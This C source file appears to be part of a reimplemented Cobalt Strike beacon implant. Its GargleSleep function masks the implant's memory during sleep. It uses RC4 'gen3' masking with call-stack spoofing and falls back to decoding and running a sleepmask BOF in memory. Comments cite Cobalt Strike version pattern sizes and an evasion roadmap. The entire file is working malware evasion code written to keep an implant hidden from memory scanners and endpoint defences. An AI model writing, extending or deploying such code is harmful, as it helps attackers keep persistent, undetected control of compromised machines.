/* gargle! */
#include <winsock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "track_memory.h"
#include "datastore.h"
#include "sleepmask_gen3.h"
#include "parse.h"
#include <stdlib.h>


typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, void(__stdcall *pSleep)(DWORD), DWORD time) {
	GARGLE_TRAMPOLINE_STUB()
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleSleep(DWORD time) {
#if !defined(_M_IX86)
	GARGLEF func;
#endif
	char * decoded;
	int dlen;

	/* nook=0: Sleep() without a 16KB stack frame (__chkstk on x86 spawn). */
	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		Sleep(time);
		return;
	}

#if defined(_M_X64)
	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
	 * any init failure falls through to the official sleepmask BOF. */
	if (gen3_sleep(time))
		return;
	g3_log("gargle: gen3 fell back to official path", 0x7fffffff);
#else
	/* x86: gen3-1a (own-table RC4 masking, no ROP) replaces the official
	 * sleepmask BOF, which crashes at blob+0x3b in our WOW64 layout.
	 * Serving the window directly also skips the whole decode path. */
	if (gen3_sleep(time))
		return;
	Sleep(time);
	return;
#endif

	decoded = (char *)malloc(16384);
	if (decoded == NULL) {
		Sleep(time);
		return;
	}
	dlen = sleepmask_decode(decoded, 16384);
	if (dlen > 16) {
		datap parser;
		DWORD entry;
		int prefix;
		DWORD be_time;
		data_init(&parser, decoded, dlen);
		data_int(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		prefix = dlen - parser.length;
		entry = data_int(&parser);
		/* decoded holds the plaintext sleep-mask BOF across the masked
		 * sleep - pull it into the walk, then wipe it before free */
		track_memory_add(decoded, 16384, TRACK_MEMORY_MALLOC, TRUE, NULL);
#if defined(_M_X64)
		be_time = time;
		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 1))
			Sleep(time);
#else
		be_time = htonl(time);
		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 0))
			Sleep(time);
#endif
		track_memory_remove(decoded);
		memset(decoded, 0, 16384);
		free(decoded);
		return;
	}
	memset(decoded, 0, 16384);
	free(decoded);

	/* The 4.5 trampoline body is an INT3 placeholder in this codebase (the
	 * original comment said x86 must not execute it - x64 must not either):
	 * gtrampoline points at the raw template stub, so this fallback branch
	 * used to be a guaranteed INT3 storm whenever it was reached with
	 * nook != 0 (no gen3, no decodable sleepmask BOF). Degrade to a plain
	 * Sleep instead - unmasked, never a crash. A real wait-window variant
	 * belongs to the gen3 family (follow-up entry in EVASION-ROADMAP). */
	Sleep(time);
#if defined(_M_X64)
	(void)func;
#endif
}